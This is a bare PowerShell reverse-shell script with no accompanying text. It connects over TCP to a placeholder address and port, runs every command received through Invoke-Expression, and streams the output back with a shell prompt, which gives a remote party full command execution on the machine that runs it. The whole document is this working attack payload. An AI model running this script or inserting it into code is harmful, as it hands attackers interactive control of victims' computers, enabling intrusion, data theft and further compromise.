$ADDRESS='<ADDRESS>'
$PORT=<PORT>
$CLIENT = New-Object System.Net.Sockets.TCPClient($ADDRESS,$PORT)
$STREAM = $CLIENT.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$SENDBACK = (iex $DATA 2>&1 | Out-String )
$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> '
$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
$STREAM.Flush()
}
$CLIENT.Close()
